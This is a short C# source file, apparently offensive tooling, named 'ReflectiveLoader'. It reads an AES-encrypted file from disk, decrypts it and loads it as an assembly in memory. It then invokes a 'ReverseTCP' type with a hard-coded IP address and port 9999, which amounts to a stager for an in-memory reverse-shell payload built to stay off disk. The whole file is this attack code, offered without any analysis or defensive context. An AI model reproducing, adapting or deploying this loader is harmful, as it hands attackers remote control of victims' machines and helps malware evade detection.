using System;
using System.Reflection;

namespace ReflectiveLoader
{
    internal class ReflectiveLoaderMain
    {
        static String TYPENAME = "ReflectiveLoader.ReverseTCPNonCoreMain"; // TODO: define config file?
        static String ENCRPATH = "f23f9c22dcccafe4723c5aca51c96870afc4130bc2b5c5f0b8dab9e51cf902e3"; // TODO: also put in config file

        static BindingFlags FLAGS_ALL_STATIC = BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.Public;

        static void Main()
        {
            // TODO: define config file?
            byte[] bytesEncr = File.ReadAllBytes(ENCRPATH);
            byte[] key = File.ReadAllBytes(ENCRPATH + ".key");
            byte[] IV = File.ReadAllBytes(ENCRPATH + ".IV");

            byte[] bytesPlain = BinaryEncryptor.DecryptAes(bytesEncr, key, IV);

            Assembly assembly = Assembly.Load(bytesPlain);

            Type type = assembly.GetType(TYPENAME);

            var method = type.GetMethod("preMainInit", FLAGS_ALL_STATIC, new Type[] { typeof(String), typeof(int) });
            var res = method.Invoke(null, new Object[] { "192.168.111.133", 9999 });

            method = type.GetMethod("Main", FLAGS_ALL_STATIC, new Type[] { });
            res = method.Invoke(null, null);

            Console.ReadLine();
        }
    }
}